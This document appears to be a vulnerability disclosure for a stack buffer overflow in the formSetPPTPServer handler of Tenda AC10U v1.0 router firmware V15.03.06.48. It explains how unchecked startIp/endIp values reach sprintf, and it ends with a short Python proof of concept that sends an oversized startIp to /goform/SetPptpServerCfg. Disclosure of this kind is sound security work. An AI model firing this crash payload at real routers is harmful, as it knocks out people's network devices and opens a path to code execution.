## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3170.html

## Affected version

AC10U v1.0 Firmware V15.03.06.48

## Vulnerability details

The Tenda AC10U v1.0 Firmware V15.03.06.48 firmware has a stack overflow vulnerability in the `formSetPPTPServer` function. The `pptp_server_start_ip` variable receives the `startIP` parameter  and the `pptp_server_end_ip` variable receives the `endIP` parameter from two POST requests. the value of `startIp` is formatted using the `sscanf` function with the format `%[^.].%[^.].%[^.].%s`. Then variable `pptp_server_start_ip` and `pptp_server_end_each_ip[3]` is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `startIP` and `endIP` can trigger this security vulnerability.

![image-20240313234025695](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313234025695.png)

![image-20240313234042401](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313234042401.png)

![image-20240313234218534](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313234218534.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetPptpServerCfg"
payload = 'a'*1000

data = {"startIp": payload,"endIp": 1}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240313234334731](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313234334731.png)